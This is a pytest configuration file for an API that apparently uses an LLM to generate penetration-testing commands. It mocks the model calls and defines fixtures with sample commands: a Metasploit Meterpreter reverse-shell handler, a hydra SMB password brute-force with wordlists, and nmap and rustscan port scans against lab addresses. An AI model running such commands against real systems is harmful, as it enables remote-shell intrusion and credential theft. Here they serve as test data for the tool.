"""Test configuration for wish-command-generation-api."""

import json
import os
from unittest.mock import MagicMock, patch

import pytest

# Mock API keys for unit tests
MOCK_OPENAI_API_KEY = "sk-test-key"
MOCK_LANGCHAIN_API_KEY = "ls-test-key"

@pytest.fixture(autouse=True)
def setup_test_env(request):
    """Set up test environment.

    Unit tests: Mock API keys
    Integration tests: Use actual API keys
    """
    # Get test path
    test_path = request.node.fspath.strpath

    # For unit tests only
    if "/unit/" in test_path:
        with patch.dict(os.environ, {
            "OPENAI_API_KEY": MOCK_OPENAI_API_KEY,
            "LANGCHAIN_API_KEY": MOCK_LANGCHAIN_API_KEY,
            "LANGCHAIN_TRACING_V2": "false"  # Disable tracing for unit tests
        }):
            yield
    # For integration tests - no mocking, use actual environment variables
    else:
        yield


@pytest.fixture(autouse=True)
def mock_openai_api(monkeypatch, request):
    """Mock OpenAI API calls for unit tests.

    This prevents actual API calls during unit tests.
    """
    # Get test path
    test_path = request.node.fspath.strpath

    # For unit tests only
    if "/unit/" in test_path:
        # モックレスポンスの作成
        mock_response = MagicMock()
        mock_response.choices = [MagicMock()]
        mock_response.choices[0].message.content = json.dumps({"command": "mocked command response"})
        mock_response.choices[0].message.model_dump.return_value = {
            "content": json.dumps({"command": "mocked command response"})
        }
        mock_response.generations = [[MagicMock()]]

        # OpenAIのcreateメソッドをモック
        with patch("openai.resources.chat.completions.Completions.create", return_value=mock_response):
            # LangSmithのトレーシングもモック
            with patch("langsmith.run_helpers.traceable", lambda f: f):
                yield
    else:
        yield


@pytest.fixture
def mock_command_response():
    """Create a mock command response for dialog avoidance."""
    return json.dumps({
        "command": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; "
                   "set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\""
    })


@pytest.fixture
def mock_list_files_response():
    """Create a mock list files response."""
    return json.dumps({
        "command": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
                   "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"
    })


@pytest.fixture
def mock_network_error_response():
    """Create a mock network error response."""
    return json.dumps({
        "command_inputs": [
            {
                "command": "nmap -p- 10.10.10.40",
                "timeout_sec": 60
            }
        ]
    })


@pytest.fixture
def mock_timeout_response():
    """Create a mock timeout response."""
    return json.dumps({
        "command_inputs": [
            {
                "command": "rustscan -a 10.10.10.40",
                "timeout_sec": 60
            }
        ]
    })


@pytest.fixture
def mock_timeout_multiple_response():
    """Create a mock timeout response with multiple commands."""
    return json.dumps({
        "command_inputs": [
            {
                "command": "nmap -p1-32768 10.10.10.40",
                "timeout_sec": 60
            },
            {
                "command": "nmap -p32769-65535 10.10.10.40",
                "timeout_sec": 60
            }
        ]
    })
